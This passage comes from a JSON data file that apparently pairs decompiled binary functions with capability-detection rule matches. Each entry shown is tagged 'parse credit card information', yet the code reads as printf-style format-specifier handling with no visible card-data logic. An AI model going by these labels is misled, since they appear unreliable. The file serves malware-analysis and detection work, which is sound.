== 'X') {\n            arg_8h = 1;\ncode_r0x0044e327:\n            cVar9 = fcn.004436d8(arg_8h);\n        }\n        else {\n            if (cVar9 != 'Z') {\n                if (cVar9 != 'a') {\n                    if (cVar9 != 'c') goto code_r0x0044e608;\n                    goto code_r0x0044e316;\n                }\n                goto code_r0x0044e2fa;\n            }\n            cVar9 = fcn.004504d3();\n        }\n    }\n    else if (cVar9 < 'p') {\n        if (cVar9 == 'o') {\n            cVar9 = fcn.00452c3c();\n        }\n        else {\n            if (((cVar9 == 'e') || (cVar9 == 'f')) || (cVar9 == 'g')) goto code_r0x0044e2fa;\n            if (cVar9 == 'i') goto code_r0x0044e354;\n            if (cVar9 != 'n') goto code_r0x0044e608;\n            cVar9 = fcn.00452728();\n        }\n    }\n    else {\n        if (cVar9 != 'p') {\n            if (cVar9 == 's') goto code_r0x0044e37d;\n            if (cVar9 != 'u') {\n                if (cVar9 != 'x') goto code_r0x0044e608;\n                arg_8h = 0;\n                goto code_r0x0044e327;\n            }\n            goto code_r0x0044e358;\n        }\n        cVar9 = fcn.00452d7c();\n    }\ncode_r0x0044e389:\n    if (((cVar9 != '\\0') && (cVar9 = fcn.0044ad41(),  cVar9 == '\\0')) && (*(param_1 + 0xb) == '\\0')) {\n        iVar13 = 0;\n        iVar17 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar13 = 1;\n                    iVar17 = 1;\n                }\n            }\n            else {\n                iVar17 = 1;\n                iVar13 = 1;\n            }\n        }\n        cVar9 = *(param_1 + 0x2d);\n        if (((cVar9 != 'x') && (cVar9 != 'X')) || (bVar7 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar7 = false;\n        }\n        if ((cVar9 == 'a') || (bVar8 = false,  cVar9 == 'A')) {\n            bVar8 = true;\n        }\n        if ((bVar7) || (bVar8)) {\n            (&stack0xffffffec)[iVar13] = 0x30;\n            if ((cVar9 == 'X') || (cVar9 == 'A')) {\n                uVar10 = 0x58;\n            }\n            else {\n                uVar10 = 0x78;\n            }\n            (&stack0xffffffed)[iVar13] = uVar10;\n            iVar13 = iVar13 + 2;\n            iVar17 = iVar13;\n        }\n        iVar16 = (param_1[8] - iVar13) - param_1[0xd];\n        if (((*(param_1 + 7) & 0xc) == 0) && (0 < iVar16)) {\n            uVar12 = param_1[5];\n            iVar14 = 0;\n            do {\n                uVar5 = param_1[0x112];\n                if (*(uVar5 + 8) == *(uVar5 + 4)) {\n                    if (*(uVar5 + 0xc) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = uVar12 + 1;\n                    }\n                    param_1[5] = uVar12;\n                }\n                else {\n                    param_1[5] = uVar12 + 1;\n                    *(uVar5 + 8) = *(uVar5 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    *param_1[0x112] = *param_1[0x112] + 1;\n                }\n                uVar12 = param_1[5];\n                iVar13 = iVar17;\n            } while ((uVar12 != 0xffffffff) && (iVar14 = iVar14 + 1,  iVar14 < iVar16));\n        }\n        arg_10h = param_1 + 5;\n        ppiVar1 = param_1 + 0x112;\n        fcn.004558c8(&stack0xffffffec, iVar13, arg_10h);\n        ppiVar2 = param_1 + 0x112;\n        if (((param_1[7] >> 3 & 1) != 0) && (((param_1[7] >> 2 & 1) == 0 && (iVar13 = 0,  0 < iVar16)))) {\n            do {\n                piVar6 = *ppiVar2;\n                if (piVar6[2] == piVar6[1]) {\n                    if (*(piVar6 + 3) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = *arg_10h + 1;\n                    }\n                    *arg_10h = uVar12;\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar6[2] = piVar6[2] + 1;\n                    ***ppiVar2 = 0x30;\n                    **ppiVar2 = **ppiVar2 + 1;\n                }\n            } while ((*arg_10h != 0xffffffff) && (iVar13 = iVar13 + 1,  iVar13 < iVar16));\n        }\n        iVar13 = 0;\n        if ((*(param_1 + 0xe) == '\\0') || (param_1[0xd] < 1)) {\n            fcn.004558c8(param_1[0xc], param_1[0xd], arg_10h);\n        }\n        else {\n            puVar15 = param_1[0xc];\n            uVar12 = 0;\n            do {\n                uVar3 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar14 = 0;\n                iVar17 = fcn.0045eb63(&stack0xffffffe8, &stack0xfffffff0, 6, uVar3, param_1[2]);\n                if ((iVar17 != 0) || (iVar14 == 0)) {\n                    *arg_10h = 0xffffffff;\n                    break;\n                }\n                fcn.004558c8(&stack0xfffffff0, iVar14, arg_10h);\n                uVar12 = uVar12 + 1;\n            } while (uVar12 != param_1[0xd]);\n        }\n        uVar12 = *arg_10h;\n        if (((-1 < uVar12) && ((param_1[7] >> 2 & 1) != 0)) && (0 < iVar16)) {\n            do {\n                piVar6 = *ppiVar1;\n                if (piVar6[2] == piVar6[1]) {\n                    if (*(piVar6 + 3) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = uVar12 + 1;\n                    }\n                    *arg_10h = uVar12;\n                }\n                else {\n                    *arg_10h = uVar12 + 1;\n                    piVar6[2] = piVar6[2] + 1;\n                    ***ppiVar1 = 0x20;\n                    **ppiVar1 = **ppiVar1 + 1;\n                }\n                uVar12 = *arg_10h;\n            } while ((uVar12 != 0xffffffff) && (iVar13 = iVar13 + 1,  iVar13 < iVar16));\n        }\n    }\ncode_r0x0044e608:\n    uVar12 = fcn.004303e9(unaff_EBX);\n    return uVar12;\n}\n",
        "token_count": 3276
    },
    "0044cae0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044cae0(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    uint16_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool bVar8;\n    char cVar9;\n    uchar uVar10;\n    uint32_t in_EAX;\n    char *pcVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint16_t *puVar15;\n    int32_t iVar16;\n    uint unaff_EBX;\n    uint arg_8h;\n    int32_t iVar17;\n    \n    cVar9 = *(param_1 + 0x2d);\n    pcVar11 = in_EAX & 0xffffff00;\n    if (cVar9 != 'F') {\n        if (cVar9 == 'N') {\n            pcVar11 = *param_1 & 8;\n            if (pcVar11 != NULL) goto code_r0x0044cc36;\n            *(param_1 + 6) = 8;\ncode_r0x0044cb15:\n            uVar12 = param_1[2];\n            *(uVar12 + 0x1c) = 1;\n            *(uVar12 + 0x18) = 0x16;\n            uVar12 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar12 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044cb15;\n        if (cVar9 < 'k') {\n            if (cVar9 == 'j') {\n                param_1[10] = 5;\n                goto code_r0x0044cc36;\n            }\n            if (cVar9 == 'I') {\n                pcVar4 = param_1[3];\n                cVar9 = *pcVar4;\n                if ((cVar9 == '3') && (pcVar4[1] == '2')) {\n                    pcVar11 = pcVar4 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = pcVar11;\n                }\n                else if (cVar9 == '6') {\n                    if (pcVar4[1] == '4') {\n                        pcVar11 = pcVar4 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = pcVar11;\n                    }\n                }\n                else if ((((cVar9 == 'd') || (cVar9 == 'i')) || (cVar9 == 'o')) ||\n                        (((cVar9 == 'u' || (cVar9 == 'x')) || (cVar9 == 'X')))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044cc36;\n            }\n            if (cVar9 == 'L') {\n                param_1[10] = 8;\n                goto code_r0x0044cc36;\n            }\n            if (cVar9 == 'T') {\n                param_1[10] = 0xd;\n                goto code_r0x0044cc36;\n            }\n            if (cVar9 != 'h') goto code_r0x0044cc36;\n            if (*param_1[3] == 'h') {\n                param_1[3] = param_1[3] + 1;\n                pcVar11 = 0x1;\n            }\n            else {\n                pcVar11 = 0x2;\n            }\n        }\n        else {\n            if (cVar9 != 'l') {\n                if (cVar9 == 't') {\n                    param_1[10] = 7;\n                }\n                else if (cVar9 == 'w') {\n                    param_1[10] = 0xc;\n                }\n                else if (cVar9 == 'z') {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044cc36;\n            }\n            if (*param_1[3] == 'l') {\n                param_1[3] = param_1[3] + 1;\n                pcVar11 = 0x4;\n            }\n            else {\n                pcVar11 = 0x3;\n            }\n        }\n        param_1[10] = pcVar11;\ncode_r0x0044cc36:\n        return CONCAT31(pcVar11 >> 8, 1);\n    }\n    pcVar11 = *param_1 & 8;\n    if (pcVar11 != NULL) goto code_r0x0044cc36;\n    *(param_1 + 6) = 7;\n    cVar9 = *(param_1 + 0x2d);\n    if (cVar9 < 'e') {\n        if (cVar9 == 'd') {\ncode_r0x0044e6c2:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044e6c6:\n            cVar9 = fcn.00442580(0);\n        }\n        else if (cVar9 < 'T') {\n            if (cVar9 == 'S') {\ncode_r0x0044e6eb:\n                cVar9 = fcn.0045307e();\n            }\n            else {\n                if (cVar9 != 'A') {\n                    if (cVar9 == 'C') {\ncode_r0x0044e684:\n                        cVar9 = fcn.00451f91(0);\n                        goto code_r0x0044e6f7;\n                    }\n                    if (((cVar9 != 'E') && (cVar9 != 'F')) && (cVar9 != 'G')) goto code_r0x0044e967;\n                }\ncode_r0x0044e668:\n                cVar9 = fcn.0045103f();\n            }\n        }\n        else if (cVar9 == 'X') {\n            arg_8h = 1;\ncode_r0x0044e695:\n            cVar9 = fcn.00443874(arg_8h);\n        }\n        else {\n            if (cVar9 != 'Z') {\n                if (cVar9 != 'a') {\n                    if (cVar9 != 'c') goto code_r0x0044e967;\n                    goto code_r0x0044e684;\n                }\n                goto code_r0x0044e668;\n            }\n            cVar9 = fcn.0045054d();\n        }\n    }\n    else if (cVar9 < 'p') {\n        if (cVar9 == 'o') {\n            cVar9 = fcn.00452c59();\n        }\n        else {\n            if (((cVar9 == 'e') || (cVar9 == 'f')) || (cVar9 == 'g')) goto code_r0x0044e668;\n            if (cVar9 == 'i') goto code_r0x0044e6c2;\n            if (cVar9 != 'n') goto code_r0x0044e967;\n            cVar9 = fcn.004527d5();\n        }\n    }\n    else {\n        if (cVar9 != 'p') {\n            if (cVar9 == 's') goto code_r0x0044e6eb;\n            if (cVar9 != 'u') {\n                if (cVar9 != 'x') goto code_r0x0044e967;\n                arg_8h = 0;\n                goto code_r0x0044e695;\n            }\n            goto code_r0x0044e6c6;\n        }\n        cVar9 = fcn.00452d92();\n    }\ncode_r0x0044e6f7:\n    if ((cVar9 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        iVar13 = 0;\n        iVar17 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar13 = 1;\n                    iVar17 = 1;\n                }\n            }\n            else {\n                iVar17 = 1;\n                iVar13 = 1;\n            }\n        }\n        cVar9 = *(param_1 + 0x2d);\n        if (((cVar9 != 'x') && (cVar9 != 'X')) || (bVar7 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar7 = false;\n        }\n        if ((cVar9 == 'a') || (bVar8 = false,  cVar9 == 'A')) {\n            bVar8 = true;\n        }\n        if ((bVar7) || (bVar8)) {\n            (&stack0xffffffec)[iVar13] = 0x30;\n            if ((cVar9 == 'X') || (cVar9 == 'A')) {\n                uVar10 = 0x58;\n            }\n            else {\n                uVar10 = 0x78;\n            }\n            (&stack0xffffffed)[iVar13] = uVar10;\n            iVar13 = iVar13 + 2;\n            iVar17 = iVar13;\n        }\n        iVar16 = (param_1[8] - iVar13) - param_1[0xd];\n        if (((*(param_1 + 7) & 0xc) == 0) && (0 < iVar16)) {\n            uVar12 = param_1[5];\n            iVar14 = 0;\n            do {\n                uVar5 = param_1[0x112];\n                if (*(uVar5 + 8) == *(uVar5 + 4)) {\n                    if (*(uVar5 + 0xc) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = uVar12 + 1;\n                    }\n                    param_1[5] = uVar12;\n                }\n                else {\n                    param_1[5] = uVar12 + 1;\n                    *(uVar5 + 8) = *(uVar5 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    *param_1[0x112] = *param_1[0x112] + 1;\n                }\n                uVar12 = param_1[5];\n                iVar13 = iVar17;\n            } while ((uVar12 != 0xffffffff) && (iVar14 = iVar14 + 1,  iVar14 < iVar16));\n        }\n        arg_10h = param_1 + 5;\n        ppiVar1 = param_1 + 0x112;\n        fcn.004558c8(&stack0xffffffec, iVar13, arg_10h);\n        ppiVar2 = param_1 + 0x112;\n        if (((param_1[7] >> 3 & 1) != 0) && (((param_1[7] >> 2 & 1) == 0 && (iVar13 = 0,  0 < iVar16)))) {\n            do {\n                piVar6 = *ppiVar2;\n                if (piVar6[2] == piVar6[1]) {\n                    if (*(piVar6 + 3) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = *arg_10h + 1;\n                    }\n                    *arg_10h = uVar12;\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar6[2] = piVar6[2] + 1;\n                    ***ppiVar2 = 0x30;\n                    **ppiVar2 = **ppiVar2 + 1;\n                }\n            } while ((*arg_10h != 0xffffffff) && (iVar13 = iVar13 + 1,  iVar13 < iVar16));\n        }\n        iVar13 = 0;\n        if ((*(param_1 + 0xe) == '\\0') || (param_1[0xd] < 1)) {\n            fcn.004558c8(param_1[0xc], param_1[0xd], arg_10h);\n        }\n        else {\n            puVar15 = param_1[0xc];\n            uVar12 = 0;\n            do {\n                uVar3 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar14 = 0;\n                iVar17 = fcn.0045eb63(&stack0xffffffe8, &stack0xfffffff0, 6, uVar3, param_1[2]);\n                if ((iVar17 != 0) || (iVar14 == 0)) {\n                    *arg_10h = 0xffffffff;\n                    break;\n                }\n                fcn.004558c8(&stack0xfffffff0, iVar14, arg_10h);\n                uVar12 = uVar12 + 1;\n            } while (uVar12 != param_1[0xd]);\n        }\n        uVar12 = *arg_10h;\n        if (((-1 < uVar12) && ((param_1[7] >> 2 & 1) != 0)) && (0 < iVar16)) {\n            do {\n                piVar6 = *ppiVar1;\n                if (piVar6[2] == piVar6[1]) {\n                    if (*(piVar6 + 3) == '\\0') {\n                        uVar12 = 0xffffffff;\n                    }\n                    else {\n                        uVar12 = uVar12 + 1;\n                    }\n                    *arg_10h = uVar12;\n                }\n                else {\n                    *arg_10h = uVar12 + 1;\n                    piVar6[2] = piVar6[2] + 1;\n                    ***ppiVar1 = 0x20;\n                    **ppiVar1 = **ppiVar1 + 1;\n                }\n                uVar12 = *arg_10h;\n            } while ((uVar12 != 0xffffffff) && (iVar13 = iVar13 + 1,  iVar13 < iVar16));\n        }\n    }\ncode_r0x0044e967:\n    uVar12 = fcn.004303e9(unaff_EBX);\n    return uVar12;\n}\n",
        "token_count": 3259
    },
    "0044cc39": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044cc39(uint32_t *param_1)\n\n{\n    uint32_t *arg_ch;\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t *puVar3;\n    bool bVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t arg_ch_00;\n    uint unaff_EBX;\n    int32_t iVar8;\n    uint16_t *puVar9;\n    ushort uVar10;\n    int32_t iVar11;\n    bool bVar12;\n    uint arg_8h;\n    uint32_t uStack32;\n    uint32_t *puVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int16_t iVar16;\n    \n    uVar1 = *(param_1 + 0x2e);\n    puVar9 = uVar1;\n    if (puVar9 != 0x46) {\n        if (puVar9 == 0x4e) {\n            puVar9 = *param_1 & 8;\n            if (puVar9 != NULL) goto code_r0x0044cdbf;\n            *(param_1 + 6) = 8;\ncode_r0x0044cc77:\n            uVar6 = param_1[2];\n            *(uVar6 + 0x1c) = 1;\n            *(uVar6 + 0x18) = 0x16;\n            uStack32 = 0x44cc94;\n            uVar6 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar6 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044cc77;\n        if (uVar1 < 0x6b) {\n            if (uVar1 == 0x6a) {\n                param_1[10] = 5;\n                goto code_r0x0044cdbf;\n            }\n            if (puVar9 == 0x49) {\n                puVar3 = param_1[3];\n                puVar9 = *puVar3;\n                if ((puVar9 == 0x33) && (puVar3[1] == 0x32)) {\n                    puVar9 = puVar3 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = puVar9;\n                }\n                else if (puVar9 == 0x36) {\n                    if (puVar3[1] == 0x34) {\n                        puVar9 = puVar3 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = puVar9;\n                    }\n                }\n                else if ((((puVar9 == 0x64) || (puVar9 == 0x69)) || (puVar9 == 0x6f)) ||\n                        (((puVar9 == 0x75 || (puVar9 == 0x78)) || (puVar9 == 0x58)))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044cdbf;\n            }\n            if (puVar9 == 0x4c) {\n                param_1[10] = 8;\n                goto code_r0x0044cdbf;\n            }\n            if (puVar9 == 0x54) {\n                param_1[10] = 0xd;\n                goto code_r0x0044cdbf;\n            }\n            if (uVar1 != 0x68) goto code_r0x0044cdbf;\n            if (*param_1[3] == 0x68) {\n                param_1[3] = param_1[3] + 1;\n                puVar9 = 0x1;\n            }\n            else {\n                puVar9 = 0x2;\n            }\n        }\n        else {\n            if (uVar1 != 0x6c) {\n                if (puVar9 == 0x74) {\n                    param_1[10] = 7;\n                }\n                else if (puVar9 == 0x77) {\n                    param_1[10] = 0xc;\n                }\n                else if (puVar9 == 0x7a) {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044cdbf;\n            }\n            if (*param_1[3] == 0x6c) {\n                param_1[3] = param_1[3] + 1;\n                puVar9 = 0x4;\n            }\n            else {\n                puVar9 = 0x3;\n            }\n        }\n        param_1[10] = puVar9;\ncode_r0x0044cdbf:\n        return CONCAT31(puVar9 >> 8, 1);\n    }\n    puVar9 = *param_1 & 8;\n    if (puVar9 != NULL) goto code_r0x0044cdbf;\n    *(param_1 + 6) = 7;\n    iVar16 = 0x41;\n    iVar8 = 0;\n    uVar1 = *(param_1 + 0x2e);\n    puVar13 = param_1;\n    if (uVar1 < 0x65) {\n        if (uVar1 == 100) {\ncode_r0x0044ea39:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044ea3d:\n            cVar5 = fcn.0044270d(0);\n        }\n        else if (uVar1 < 0x54) {\n            if (uVar1 == 0x53) {\ncode_r0x0044ea66:\n                cVar5 = fcn.004530f0();\n            }\n            else {\n                if (uVar1 != 0x41) {\n                    if (uVar1 == 0x43) {\ncode_r0x0044e9f3:\n                        cVar5 = fcn.00452026(0);\n                        goto code_r0x0044ea76;\n                    }\n                    if (((uVar1 != 0x45) && (uVar1 != 0x46)) && (uVar1 != 0x47)) goto code_r0x0044ecc5;\n                }\ncode_r0x0044e9d2:\n                cVar5 = fcn.004511d0();\n            }\n        }\n        else if (uVar1 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044ea08:\n            cVar5 = fcn.00443a01(arg_8h);\n        }\n        else {\n            if (uVar1 != 0x5a) {\n                if (uVar1 != 0x61) {\n                    if (uVar1 != 99) goto code_r0x0044ecc5;\n                    goto code_r0x0044e9f3;\n                }\n                goto code_r0x0044e9d2;\n            }\n            cVar5 = fcn.004505b0();\n        }\n    }\n    else if (uVar1 < 0x70) {\n        if (uVar1 == 0x6f) {\n            cVar5 = fcn.00452c76();\n        }\n        else {\n            if (((uVar1 == 0x65) || (uVar1 == 0x66)) || (uVar1 == 0x67)) goto code_r0x0044e9d2;\n            if (uVar1 == 0x69) goto code_r0x0044ea39;\n            if (uVar1 != 0x6e) goto code_r0x0044ecc5;\n            cVar5 = fcn.0045285a();\n        }\n    }\n    else {\n        if (uVar1 != 0x70) {\n            if (uVar1 == 0x73) goto code_r0x0044ea66;\n            if (uVar1 != 0x75) {\n                if (uVar1 != 0x78) goto code_r0x0044ecc5;\n                arg_8h = 0;\n                goto code_r0x0044ea08;\n            }\n            goto code_r0x0044ea3d;\n        }\n        cVar5 = fcn.00452da8();\n    }\ncode_r0x0044ea76:\n    if ((cVar5 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        iVar7 = 0;\n        iVar14 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar7 = 1;\n                    iVar14 = 1;\n                }\n            }\n            else {\n                iVar14 = 1;\n                iVar7 = 1;\n            }\n        }\n        iVar2 = *(param_1 + 0x2e);\n        if (((iVar2 != 0x78) && (iVar2 != 0x58)) || (bVar12 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar12 = false;\n        }\n        if ((iVar2 == 0x61) || (bVar4 = false,  iVar2 == iVar16)) {\n            bVar4 = true;\n        }\n        uStack32 = 0x30;\n        if ((bVar12) || (bVar4)) {\n            *(&stack0xfffffff0 + iVar7 * 2) = 0x30;\n            if ((iVar2 == 0x58) || (uVar10 = 0x78,  iVar2 == iVar16)) {\n                uVar10 = 0x58;\n            }\n            *(&stack0xfffffff2 + iVar7 * 2) = uVar10;\n            iVar7 = iVar7 + 2;\n            iVar14 = iVar7;\n        }\n        iVar11 = (param_1[8] - param_1[0xd]) - iVar7;\n        if ((*(param_1 + 7) & 0xc) == 0) {\n            uVar6 = param_1[2];\n            arg_ch = param_1 + 5;\n            if (0 < iVar11) {\n                do {\n                    iVar7 = iVar14;\n                    param_1 = puVar13;\n                    fcn.00454eb0(0x20, arg_ch, uVar6);\n                    if (*arg_ch == 0xffffffff) break;\n                    iVar8 = iVar8 + 1;\n                    puVar13 = param_1;\n                    iVar14 = iVar7;\n                } while (iVar8 < iVar11);\n            }\n        }\n        puVar13 = param_1 + 5;\n        fcn.0045589c(&stack0xfffffff0, iVar7, puVar13, param_1[2]);\n        if (((param_1[7] >> 3 & 1) != 0) && ((param_1[7] >> 2 & 1) == 0)) {\n            uVar6 = param_1[2];\n            iVar8 = 0;\n            if (0 < iVar11) {\n                do {\n                    fcn.00454eb0(uStack32, param_1 + 5, uVar6);\n                    if (param_1[5] == 0xffffffff) break;\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < iVar11);\n            }\n        }\n        iVar8 = 0;\n        if ((*(param_1 + 0xe) == '\\0') && (0 < param_1[0xd])) {\n            uVar6 = param_1[2];\n            if (*(uVar6 + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            arg_ch_00 = param_1[0xc];\n            uVar15 = 0;\n            bVar12 = param_1[0xd] == 0;\n            while (!bVar12) {\n                uStack32 = uStack32 & 0xffff0000;\n                iVar7 = fcn.0045ee07(&stack0xffffffe0, arg_ch_00, *(*(uVar6 + 0xc) + 4), param_1[2]);\n                if (iVar7 < 1) {\n                    param_1[5] = 0xffffffff;\n                    break;\n                }\n                fcn.00454eb0(uStack32, param_1 + 5, param_1[2]);\n                arg_ch_00 = arg_ch_00 + iVar7;\n                uVar15 = uVar15 + 1;\n                bVar12 = uVar15 == param_1[0xd];\n            }\n        }\n        else {\n            fcn.0045589c(param_1[0xc], param_1[0xd], param_1 + 5, param_1[2]);\n        }\n        if (((-1 < param_1[5]) && ((param_1[7] >> 2 & 1) != 0)) && (uVar6 = param_1[2],  0 < iVar11)) {\n            do {\n                fcn.00454eb0(0x20, puVar13, uVar6);\n                if (*puVar13 == 0xffffffff) break;\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < iVar11);\n        }\n    }\ncode_r0x0044ecc5:\n    uVar6 = fcn.004303e9(unaff_EBX);\n    return uVar6;\n}\n",
        "token_count": 3087
    },
    "0044cdc3": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044cdc3(uint32_t *param_1)\n\n{\n    uint32_t *arg_ch;\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t *puVar3;\n    bool bVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t arg_ch_00;\n    uint unaff_EBX;\n    int32_t iVar8;\n    uint16_t *puVar9;\n    ushort uVar10;\n    int32_t iVar11;\n    bool bVar12;\n    uint arg_8h;\n    uint32_t uStack32;\n    uint32_t *puVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int16_t iVar16;\n    \n    uVar1 = *(param_1 + 0x2e);\n    puVar9 = uVar1;\n    if (puVar9 != 0x46) {\n        if (puVar9 == 0x4e) {\n            puVar9 = *param_1 & 8;\n            if (puVar9 != NULL) goto code_r0x0044cf49;\n            *(param_1 + 6) = 8;\ncode_r0x0044ce01:\n            uVar6 = param_1[2];\n            *(uVar6 + 0x1c) = 1;\n            *(uVar6 + 0x18) = 0x16;\n            uStack32 = 0x44ce1e;\n            uVar6 = fcn.0043bac1(0, 0, 0, 0, 0, param_1[2]);\n            return uVar6 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0044ce01;\n        if (uVar1 < 0x6b) {\n            if (uVar1 == 0x6a) {\n                param_1[10] = 5;\n                goto code_r0x0044cf49;\n            }\n            if (puVar9 == 0x49) {\n                puVar3 = param_1[3];\n                puVar9 = *puVar3;\n                if ((puVar9 == 0x33) && (puVar3[1] == 0x32)) {\n                    puVar9 = puVar3 + 2;\n                    param_1[10] = 10;\n                    param_1[3] = puVar9;\n                }\n                else if (puVar9 == 0x36) {\n                    if (puVar3[1] == 0x34) {\n                        puVar9 = puVar3 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = puVar9;\n                    }\n                }\n                else if ((((puVar9 == 0x64) || (puVar9 == 0x69)) || (puVar9 == 0x6f)) ||\n                        (((puVar9 == 0x75 || (puVar9 == 0x78)) || (puVar9 == 0x58)))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0044cf49;\n            }\n            if (puVar9 == 0x4c) {\n                param_1[10] = 8;\n                goto code_r0x0044cf49;\n            }\n            if (puVar9 == 0x54) {\n                param_1[10] = 0xd;\n                goto code_r0x0044cf49;\n            }\n            if (uVar1 != 0x68) goto code_r0x0044cf49;\n            if (*param_1[3] == 0x68) {\n                param_1[3] = param_1[3] + 1;\n                puVar9 = 0x1;\n            }\n            else {\n                puVar9 = 0x2;\n            }\n        }\n        else {\n            if (uVar1 != 0x6c) {\n                if (puVar9 == 0x74) {\n                    param_1[10] = 7;\n                }\n                else if (puVar9 == 0x77) {\n                    param_1[10] = 0xc;\n                }\n                else if (puVar9 == 0x7a) {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0044cf49;\n            }\n            if (*param_1[3] == 0x6c) {\n                param_1[3] = param_1[3] + 1;\n                puVar9 = 0x4;\n            }\n            else {\n                puVar9 = 0x3;\n            }\n        }\n        param_1[10] = puVar9;\ncode_r0x0044cf49:\n        return CONCAT31(puVar9 >> 8, 1);\n    }\n    puVar9 = *param_1 & 8;\n    if (puVar9 != NULL) goto code_r0x0044cf49;\n    *(param_1 + 6) = 7;\n    iVar16 = 0x41;\n    iVar8 = 0;\n    uVar1 = *(param_1 + 0x2e);\n    puVar13 = param_1;\n    if (uVar1 < 0x65) {\n        if (uVar1 == 100) {\ncode_r0x0044ed97:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0044ed9b:\n            cVar5 = fcn.0044289f(0);\n        }\n        else if (uVar1 < 0x54) {\n            if (uVar1 == 0x53) {\ncode_r0x0044edc4:\n                cVar5 = fcn.00453164();\n            }\n            else {\n                if (uVar1 != 0x41) {\n                    if (uVar1 == 0x43) {\ncode_r0x0044ed51:\n                        cVar5 = fcn.004520ce(0);\n                        goto code_r0x0044edd4;\n                    }\n                    if (((uVar1 != 0x45) && (uVar1 != 0x46)) && (uVar1 != 0x47)) goto code_r0x0044f032;\n                }\ncode_r0x0044ed30:\n                cVar5 = fcn.00451377();\n            }\n        }\n        else if (uVar1 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044ed66:\n            cVar5 = fcn.00443b93(arg_8h);\n        }\n        else {\n            if (uVar1 != 0x5a) {\n                if (uVar1 != 0x61) {\n                    if (uVar1 != 99) goto code_r0x0044f032;\n                    goto code_r0x0044ed51;\n                }\n                goto code_r0x0044ed30;\n            }\n            cVar5 = fcn.00450613();\n        }\n    }\n    else if (uVar1 < 0x70) {\n        if (uVar1 == 0x6f) {\n            cVar5 = fcn.00452c93();\n        }\n        else {\n            if (((uVar1 == 0x65) || (uVar1 == 0x66)) || (uVar1 == 0x67)) goto code_r0x0044ed30;\n            if (uVar1 == 0x69) goto code_r0x0044ed97;\n            if (uVar1 != 0x6e) goto code_r0x0044f032;\n            cVar5 = fcn.004528df();\n        }\n    }\n    else {\n        if (uVar1 != 0x70) {\n            if (uVar1 == 0x73) goto code_r0x0044edc4;\n            if (uVar1 != 0x75) {\n                if (uVar1 != 0x78) goto code_r0x0044f032;\n                arg_8h = 0;\n                goto code_r0x0044ed66;\n            }\n            goto code_r0x0044ed9b;\n        }\n        cVar5 = fcn.00452dbe();\n    